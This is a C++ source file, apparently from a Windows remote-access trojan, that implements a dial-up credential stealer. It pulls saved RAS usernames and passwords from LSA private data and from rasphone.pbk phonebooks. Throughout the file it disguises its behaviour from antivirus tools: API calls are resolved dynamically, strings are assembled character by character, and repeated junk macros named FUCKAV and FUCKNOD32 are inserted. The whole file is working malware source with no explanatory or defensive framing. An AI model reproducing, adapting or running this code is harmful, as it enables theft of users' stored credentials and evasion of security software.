// Dialupass.cpp: implementation of the CDialupass class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "Dialupass.h"
#include "until.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CDialupass::CDialupass()
{
    m_nMax = 0;
	m_lpCurrentUser = GetCurrentLoginUser();
	m_nRasCount = GetRasEntryCount();
	m_PassWords = new PASSWORDS[m_nRasCount];
	OneInfo = new COneInfo* [m_nRasCount];
	m_nUsed = 0;
	m_nCount = 0;	
	GetRasEntries();
}

CDialupass::~CDialupass()
{
    for(int i=0; i<m_nRasCount; i++)
        delete OneInfo[i];
	delete m_PassWords;
	if (!m_lpCurrentUser)
		delete m_lpCurrentUser;
}

LPTSTR CDialupass::GetLocalSid()
{
	typedef BOOL (WINAPI *FreeLibraryT)
		(
		__in HMODULE hLibModule
		);
	FreeLibraryT pFreeLibrary= (FreeLibraryT)GetProcAddress(LoadLibrary("kernel32.dll"),"FreeLibrary");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	
	typedef BOOL
		(WINAPI
		*LookupAccountNameAT)(
		__in_opt LPCSTR lpSystemName,
		__in     LPCSTR lpAccountName,
		__out_bcount_part_opt(*cbSid, *cbSid) PSID Sid,
		__inout  LPDWORD cbSid,
		__out_ecount_part_opt(*cchReferencedDomainName, *cchReferencedDomainName + 1) LPSTR ReferencedDomainName,
		__inout  LPDWORD cchReferencedDomainName,
		__out    PSID_NAME_USE peUse
		);
	char KIoFqQPSy[] = {'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	LookupAccountNameAT pLookupAccountNameA=(LookupAccountNameAT)GetProcAddress(LoadLibrary(KIoFqQPSy),"LookupAccountNameA");

	
	typedef BOOL
		(WINAPI
		*IsValidSidT)(
		__in PSID pSid
		);
	IsValidSidT pIsValidSid=(IsValidSidT)GetProcAddress(LoadLibrary(KIoFqQPSy),"IsValidSid");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	union
	{
	SID s;
	char c[256];
	}Sid;
	DWORD sizeSid=sizeof(Sid);
	char DomainName[256];
	DWORD sizeDomainName=sizeof(DomainName);
	SID_NAME_USE peUse;
	LPSTR pSid;


	if (m_lpCurrentUser == NULL)
		return NULL;

	if(!pLookupAccountNameA(NULL,m_lpCurrentUser,(SID*)&Sid,&sizeSid,DomainName,&sizeDomainName,&peUse))return NULL;
	if(!pIsValidSid(&Sid))return NULL;


	typedef BOOL  (WINAPI *ConvertSid2StringSid)(PSID  , LPTSTR *);
	ConvertSid2StringSid proc;
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	HINSTANCE	hLibrary = LoadLibrary(KIoFqQPSy);
	proc = (ConvertSid2StringSid) GetProcAddress(hLibrary, "ConvertSidToStringSidA");
	if(proc)   proc((SID*)&Sid.s,&pSid);
	pFreeLibrary(hLibrary);
	return pSid;
}

DWORD CDialupass::GetRasEntryCount()
{
	typedef LPSTR(WINAPI *lstrcatAT)
		(
		__inout LPSTR lpString1,
		__in    LPCSTR lpString2
		);
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrcatA");
	
	typedef DWORD (WINAPI *GetPrivateProfileSectionNamesAT)
		(
		__out_ecount_part_opt(nSize, return + 1) LPSTR lpszReturnBuffer,
		__in     DWORD nSize,
		__in_opt LPCSTR lpFileName
		);
	GetPrivateProfileSectionNamesAT pGetPrivateProfileSectionNamesA = (GetPrivateProfileSectionNamesAT)GetProcAddress(LoadLibrary("kernel32.dll"),"GetPrivateProfileSectionNamesA");

	
	typedef UINT
		(WINAPI
		*GetWindowsDirectoryAT)(
		__out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
		__in UINT uSize
		);
	GetWindowsDirectoryAT pGetWindowsDirectoryA=(GetWindowsDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetWindowsDirectoryA");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	typedef int
		(WINAPI
		*lstrlenAT)(
		__in LPCSTR lpString
		);	
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");

	typedef LPSTR
		(WINAPI
		*lstrcpyAT)(
		__out LPSTR lpString1,
		__in  LPCSTR lpString2
		);	
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrcpyA");

	char iYjnP[] = {'D','o','c','u','m','e','n','t','s',' ','a','n','d',' ','S','e','t','t','i','n','g','s','\\','\0'};
	char gkIvU[] = {'\\','A','p','p','l','i','c','a','t','i','o','n',' ','D','a','t','a','\\','M','i','c','r','o','s','o','f','t','\\','N','e','t','w','o','r','k','\\','C','o','n','n','e','c','t','i','o','n','s','\\','p','b','k','\\','r','a','s','p','h','o','n','e','.','p','b','k','\0'};
	char fJWFE[] = {'M','i','c','r','o','s','o','f','t','\\','N','e','t','w','o','r','k','\\','C','o','n','n','e','c','t','i','o','n','s','\\','p','b','k','\\','r','a','s','p','h','o','n','e','.','p','b','k','\0'};
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	int		nCount = 0;
	char	*lpPhoneBook[2];
    char	szPhoneBook1[MAX_PATH+1], szPhoneBook2[MAX_PATH+1];
	pGetWindowsDirectoryA(szPhoneBook1, sizeof(szPhoneBook1));
	plstrcpyA(strchr(szPhoneBook1, '\\') + 1, iYjnP);
	plstrcatA(szPhoneBook1, m_lpCurrentUser);
	plstrcatA(szPhoneBook1, gkIvU);
    SHGetSpecialFolderPath(NULL,szPhoneBook2, 0x23, 0);
	wsprintf(szPhoneBook2, "%s\\%s", szPhoneBook2, fJWFE);
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	lpPhoneBook[0] = szPhoneBook1;
	lpPhoneBook[1] = szPhoneBook2;
	
	DWORD	nSize = 1024 * 4;
	char	*lpszReturnBuffer = new char[nSize];
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	for (int i = 0; i < sizeof(lpPhoneBook) / sizeof(int); i++)
	{
		memset(lpszReturnBuffer, 0, nSize);
		pGetPrivateProfileSectionNamesA(lpszReturnBuffer, nSize, lpPhoneBook[i]);
		for(char *lpSection = lpszReturnBuffer; *lpSection != '\0'; lpSection += plstrlenA(lpSection) + 1)
		{
			nCount++;
		}
	}
	delete lpszReturnBuffer;
	return nCount;
}
PLSA_UNICODE_STRING CDialupass::GetLsaData(LPSTR KeyName)
{
	
	typedef NTSTATUS
		(NTAPI
		*LsaRetrievePrivateDataT)(
		__in LSA_HANDLE PolicyHandle,
		__in PLSA_UNICODE_STRING KeyName,
		__out PLSA_UNICODE_STRING * PrivateData
		);
	char KIoFqQPSy[] = {'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	LsaRetrievePrivateDataT pLsaRetrievePrivateData=(LsaRetrievePrivateDataT)GetProcAddress(LoadLibrary(KIoFqQPSy),"LsaRetrievePrivateData");

	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	typedef NTSTATUS
		(NTAPI
		*LsaOpenPolicyT)(
		__in_opt PLSA_UNICODE_STRING SystemName,
		__in PLSA_OBJECT_ATTRIBUTES ObjectAttributes,
		__in ACCESS_MASK DesiredAccess,
		__out PLSA_HANDLE PolicyHandle
		);
	LsaOpenPolicyT pLsaOpenPolicy=(LsaOpenPolicyT)GetProcAddress(LoadLibrary(KIoFqQPSy),"LsaOpenPolicy");

	
	typedef NTSTATUS
		(NTAPI
		*LsaCloseT)(
		__in LSA_HANDLE ObjectHandle
		);
	LsaCloseT pLsaClose=(LsaCloseT)GetProcAddress(LoadLibrary(KIoFqQPSy),"LsaClose");

	LSA_OBJECT_ATTRIBUTES LsaObjectAttribs;
	LSA_HANDLE LsaHandle;
	LSA_UNICODE_STRING LsaKeyName;
	NTSTATUS nts;
	PLSA_UNICODE_STRING OutData;
	
	ZeroMemory(&LsaObjectAttribs,sizeof(LsaObjectAttribs));
	nts=pLsaOpenPolicy(NULL,&LsaObjectAttribs,POLICY_GET_PRIVATE_INFORMATION,&LsaHandle);
	if(nts!=0)return NULL;
	AnsiStringToLsaStr(KeyName, &LsaKeyName);
	nts=pLsaRetrievePrivateData(LsaHandle, &LsaKeyName,&OutData);
	if(nts!=0)return NULL;
	nts=pLsaClose(LsaHandle);
	if(nts!=0)return NULL;
	return OutData;
}
void CDialupass::AnsiStringToLsaStr(LPSTR AValue,PLSA_UNICODE_STRING lsa)
{
	
	typedef int
		(WINAPI
		*MultiByteToWideCharT)(
		__in UINT     CodePage,
		__in DWORD    dwFlags,
		__in LPCSTR   lpMultiByteStr,
		__in int      cbMultiByte,
		__out_ecount_opt(cchWideChar) LPWSTR  lpWideCharStr,
		__in int      cchWideChar
		);
	MultiByteToWideCharT pMultiByteToWideChar=(MultiByteToWideCharT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"MultiByteToWideChar");

	typedef int
		(WINAPI
		*lstrlenAT)(
		__in LPCSTR lpString
		);	
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	lsa->Length=plstrlenA(AValue)*2;
	lsa->MaximumLength=lsa->Length+2;
	lsa->Buffer=(PWSTR)malloc(lsa->MaximumLength);
	pMultiByteToWideChar(NULL,NULL,(LPCSTR)AValue,plstrlenA(AValue),lsa->Buffer,lsa->MaximumLength);
}
///////////
void CDialupass::GetLsaPasswords()
{
	
	typedef NTSTATUS
		(NTAPI
		*LsaFreeMemoryT)(
		__in_opt PVOID Buffer
		);
	char KIoFqQPSy[] = {'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	LsaFreeMemoryT pLsaFreeMemory=(LsaFreeMemoryT)GetProcAddress(LoadLibrary(KIoFqQPSy),"LsaFreeMemory");

	PLSA_UNICODE_STRING PrivateData;
	char Win2k[]="RasDialParams!%s#0";
	char WinXP[]="L$_RasDefaultCredentials#0";
	char temp[256];
	
	wsprintf(temp,Win2k,GetLocalSid());
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	PrivateData=GetLsaData(temp);
	if(PrivateData!=NULL)
	{
		ParseLsaBuffer(PrivateData->Buffer,PrivateData->Length);
		pLsaFreeMemory(PrivateData->Buffer); 
	}
	
	PrivateData=GetLsaData(WinXP);
	if(PrivateData!=NULL)
	{ 
		ParseLsaBuffer(PrivateData->Buffer,PrivateData->Length);
		pLsaFreeMemory(PrivateData->Buffer); 
	}
}

/////////
void CDialupass::ParseLsaBuffer(LPCWSTR Buffer,USHORT Length)
{
	typedef int
		(WINAPI
		*WideCharToMultiByteT)(
		__in UINT     CodePage,
		__in DWORD    dwFlags,
		__in_opt LPCWSTR  lpWideCharStr,
		__in int      cchWideChar,
		__out_bcount_opt(cbMultiByte) LPSTR   lpMultiByteStr,
		__in int      cbMultiByte,
		__in_opt LPCSTR   lpDefaultChar,
		__out_opt LPBOOL  lpUsedDefaultChar
		);
	WideCharToMultiByteT pWideCharToMultiByte=(WideCharToMultiByteT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"WideCharToMultiByte");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	char AnsiPsw[1024];
	char chr,PswStr[256];
	PswStr[0]=0;
	pWideCharToMultiByte(0,NULL,Buffer,Length,AnsiPsw,1024,0,0);

	for(int i=0,SpacePos=0,TXT=0;i<Length/2-2;i++)
	{
	  chr=AnsiPsw[i];
	  if(chr==0)
	  {
		SpacePos++;
		switch(SpacePos)
		{
			case 1:
			PswStr[TXT]=chr;
			strcpy(m_PassWords[m_nUsed].UID,PswStr);
			break;
			case 6:
			PswStr[TXT]=chr;
			strcpy(m_PassWords[m_nUsed].login,PswStr);
			break;
			case 7:
			PswStr[TXT]=chr;
			strcpy(m_PassWords[m_nUsed].pass,PswStr);
			m_PassWords[m_nUsed].used=false;
			m_nUsed++;
			break;
		}
		ZeroMemory(PswStr,256);
		TXT=0;
	  }
	  else 
	  {
		PswStr[TXT]=chr;
		TXT++;
	  }
	  if(SpacePos==9)SpacePos=0;
	}
}

bool CDialupass::GetRasEntries()
{
	typedef LPSTR(WINAPI *lstrcatAT)
		(
		__inout LPSTR lpString1,
		__in    LPCSTR lpString2
		);
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrcatA");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	typedef DWORD (WINAPI *GetPrivateProfileSectionNamesAT)
		(
		__out_ecount_part_opt(nSize, return + 1) LPSTR lpszReturnBuffer,
		__in     DWORD nSize,
		__in_opt LPCSTR lpFileName
		);
	GetPrivateProfileSectionNamesAT pGetPrivateProfileSectionNamesA = (GetPrivateProfileSectionNamesAT)GetProcAddress(LoadLibrary("kernel32.dll"),"GetPrivateProfileSectionNamesA");

	typedef DWORD (WINAPI *GetPrivateProfileStringAT)
		(
		__in_opt LPCSTR lpAppName,
		__in_opt LPCSTR lpKeyName,
		__in_opt LPCSTR lpDefault,
		__out_ecount_part_opt(nSize, return + 1) LPSTR lpReturnedString,
		__in     DWORD nSize,
		__in_opt LPCSTR lpFileName
		);
	GetPrivateProfileStringAT pGetPrivateProfileStringA = (GetPrivateProfileStringAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetPrivateProfileStringA");

	typedef UINT
		(WINAPI
		*GetWindowsDirectoryAT)(
		__out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
		__in UINT uSize
		);
	GetWindowsDirectoryAT pGetWindowsDirectoryA=(GetWindowsDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetWindowsDirectoryA");

	
	typedef BOOL
		(WINAPI
		*GetVersionExAT)(
		__inout LPOSVERSIONINFOA lpVersionInformation
		);
	GetVersionExAT pGetVersionExA=(GetVersionExAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetVersionExA");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	typedef int
		(WINAPI
		*lstrlenAT)(
		__in LPCSTR lpString
		);	
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");

	typedef LPSTR
		(WINAPI
		*lstrcpyAT)(
		__out LPSTR lpString1,
		__in  LPCSTR lpString2
		);	
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrcpyA");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	
	typedef int
		(WINAPI
		*lstrcmpAT)(
		__in LPCSTR lpString1,
		__in LPCSTR lpString2
		);	
	lstrcmpAT plstrcmpA=(lstrcmpAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrcmpA");

	char mLYfN[] = {'D','o','c','u','m','e','n','t','s',' ','a','n','d',' ','S','e','t','t','i','n','g','s','\\','\0'};
	char yfSry[] = {'\\','A','p','p','l','i','c','a','t','i','o','n',' ','D','a','t','a','\\','M','i','c','r','o','s','o','f','t','\\','N','e','t','w','o','r','k','\\','C','o','n','n','e','c','t','i','o','n','s','\\','p','b','k','\\','r','a','s','p','h','o','n','e','.','p','b','k','\0'};
	char aMblI[] = {'M','i','c','r','o','s','o','f','t','\\','N','e','t','w','o','r','k','\\','C','o','n','n','e','c','t','i','o','n','s','\\','p','b','k','\\','r','a','s','p','h','o','n','e','.','p','b','k','\0'};
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	int		nCount = 0;
	char	*lpPhoneBook[2];
    char	szPhoneBook1[MAX_PATH+1], szPhoneBook2[MAX_PATH+1];
	pGetWindowsDirectoryA(szPhoneBook1, sizeof(szPhoneBook1));
	plstrcpyA(strchr(szPhoneBook1, '\\') + 1, mLYfN);
	plstrcatA(szPhoneBook1, m_lpCurrentUser);
	plstrcatA(szPhoneBook1, yfSry);
    SHGetSpecialFolderPath(NULL,szPhoneBook2, 0x23, 0);
	wsprintf(szPhoneBook2, "%s\\%s", szPhoneBook2, aMblI);
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	lpPhoneBook[0] = szPhoneBook1;
	lpPhoneBook[1] = szPhoneBook2;
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	
	OSVERSIONINFO osi;
	osi.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
    pGetVersionExA(&osi);
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	if(osi.dwPlatformId == VER_PLATFORM_WIN32_NT && osi.dwMajorVersion >= 5)
	{
		GetLsaPasswords();
	}	
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	DWORD	nSize = 1024 * 4;
	char	*lpszReturnBuffer = new char[nSize];

	for (int i = 0; i < sizeof(lpPhoneBook) / sizeof(int); i++)
	{
		memset(lpszReturnBuffer, 0, nSize);
		pGetPrivateProfileSectionNamesA(lpszReturnBuffer, nSize, lpPhoneBook[i]);
		for(char *lpSection = lpszReturnBuffer; *lpSection != '\0'; lpSection += plstrlenA(lpSection) + 1)
		{	
			char	*lpRealSection = (char *)UTF8ToGB2312(lpSection);
			char	strDialParamsUID[256];
			char	strUserName[256];
			char	strPassWord[256];
			char	strPhoneNumber[256];
			char	strDevice[256];
			memset(strDialParamsUID, 0, sizeof(strDialParamsUID));
			memset(strUserName, 0, sizeof(strUserName));
			memset(strPassWord, 0, sizeof(strPassWord));
			memset(strPhoneNumber, 0, sizeof(strPhoneNumber));
			memset(strDevice, 0, sizeof(strDevice));


			int	nBufferLen = pGetPrivateProfileStringA(lpSection, "DialParamsUID", 0, 
				strDialParamsUID, sizeof(strDialParamsUID),	lpPhoneBook[i]);

			if (nBufferLen > 0)//DialParamsUID=4326020    198064
			{
				for(int j=0; j< (int)m_nRasCount; j++)
				{
					if(plstrcmpA(strDialParamsUID, m_PassWords[j].UID)==0)
					{
						plstrcpyA(strUserName, m_PassWords[j].login); 
						plstrcpyA(strPassWord, m_PassWords[j].pass); 
						m_PassWords[j].used=true;
						m_nUsed++;
						break;
					}
				}
			}
			FUCKAV2
				FUCKAV2
				FUCKAV2
				FUCKAV2
				ANTIVIRUS
				FUCKNOD32
	FUCKAV
			pGetPrivateProfileStringA(lpSection, "PhoneNumber", 0, 
				strPhoneNumber, sizeof(strDialParamsUID),	lpPhoneBook[i]);
			pGetPrivateProfileStringA(lpSection, "Device", 0, 
				strDevice, sizeof(strDialParamsUID),	lpPhoneBook[i]);
			char *lpRealDevice = (char *)UTF8ToGB2312(strDevice);
			char *lpRealUserName = (char *)UTF8ToGB2312(strUserName);
	 		Set(strDialParamsUID, lpRealSection, lpRealUserName, strPassWord,
 			strPhoneNumber, lpRealDevice);
			delete	lpRealSection;
			delete	lpRealUserName;
			delete	lpRealDevice;
		}
	}
	delete lpszReturnBuffer;

	return true;
}

LPCTSTR CDialupass::UTF8ToGB2312(char UTF8Str[])
{
	typedef int
		(WINAPI
		*MultiByteToWideCharT)(
		__in UINT     CodePage,
		__in DWORD    dwFlags,
		__in LPCSTR   lpMultiByteStr,
		__in int      cbMultiByte,
		__out_ecount_opt(cchWideChar) LPWSTR  lpWideCharStr,
		__in int      cchWideChar
		);
	MultiByteToWideCharT pMultiByteToWideChar=(MultiByteToWideCharT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"MultiByteToWideChar");

	
	typedef int
		(WINAPI
		*WideCharToMultiByteT)(
		__in UINT     CodePage,
		__in DWORD    dwFlags,
		__in_opt LPCWSTR  lpWideCharStr,
		__in int      cchWideChar,
		__out_bcount_opt(cbMultiByte) LPSTR   lpMultiByteStr,
		__in int      cbMultiByte,
		__in_opt LPCSTR   lpDefaultChar,
		__out_opt LPBOOL  lpUsedDefaultChar
		);
	WideCharToMultiByteT pWideCharToMultiByte=(WideCharToMultiByteT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"WideCharToMultiByte");

	typedef int
		(WINAPI
		*lstrlenAT)(
		__in LPCSTR lpString
		);	
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");


	if (UTF8Str == NULL || plstrlenA(UTF8Str) == 0)
		return "";
	int	nStrLen = plstrlenA(UTF8Str) * 2;
	char *lpWideCharStr = new char[nStrLen];
	char *lpMultiByteStr = new char[nStrLen];

	pMultiByteToWideChar(CP_UTF8, 0, UTF8Str, -1, (LPWSTR)lpWideCharStr, nStrLen);
	pWideCharToMultiByte(CP_ACP, 0, (LPWSTR)lpWideCharStr, -1, lpMultiByteStr, nStrLen, 0, 0);

	delete lpWideCharStr;
	return lpMultiByteStr;
}
BOOL CDialupass::Set(char *DialParamsUID, char *Name,char *User,char *Password,char *PhoneNumber, char *Device)
{
	for(int i=0; i<m_nMax; i++){
        if(0==strcmp(OneInfo[i]->Get(STR_DialParamsUID), DialParamsUID)){
			
            if(Name!=NULL)
                OneInfo[i]->Set(STR_Name,Name);
            if(User!=NULL)
                OneInfo[i]->Set(STR_User,User);
            if(Password!=NULL)
                OneInfo[i]->Set(STR_Password,Password);
            if(PhoneNumber!=NULL)
                OneInfo[i]->Set(STR_PhoneNumber,PhoneNumber);
            if(Device!=NULL)
                OneInfo[i]->Set(STR_Device, Device);
            return TRUE;
        }
    }
	
    if(m_nMax < m_nRasCount){
		
        OneInfo[m_nMax] = new COneInfo;
		OneInfo[m_nMax]->Set(STR_DialParamsUID,DialParamsUID);
        OneInfo[m_nMax]->Set(STR_Name,Name);
        OneInfo[m_nMax]->Set(STR_User,User);
        OneInfo[m_nMax]->Set(STR_Password,Password);
        OneInfo[m_nMax]->Set(STR_PhoneNumber,PhoneNumber);
        OneInfo[m_nMax]->Set(STR_Device,Device);
        m_nMax ++;
        return TRUE;
    }
	return false;
}